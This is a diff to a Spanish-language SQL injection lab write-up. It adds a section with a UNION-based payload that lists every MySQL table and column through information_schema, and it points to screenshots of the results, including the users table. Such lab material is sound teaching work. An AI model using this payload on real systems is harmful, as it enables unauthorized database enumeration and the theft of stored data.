@@ -82,3 +82,12 @@ Obtenemos resultados del nombre de la base de datos con la información de sus c
 
 Vemos otra base de datos con la información de sus columnas dentro de mysql→
 ![](capturas/sql-injection-lab1-8.png)
+
+
+# Todos las columnas de MySQL
+Inyección SQL →
+```
+999' UNION select null, table_name, column_name FROM information_Schema.columns;#
+```
+Muestra el nombre de la tabla y todas sus columnas. Vemos en concreto los resultados en las tablas usuarios y artículos →
+![](capturas/sql-injection-lab1-9.png)
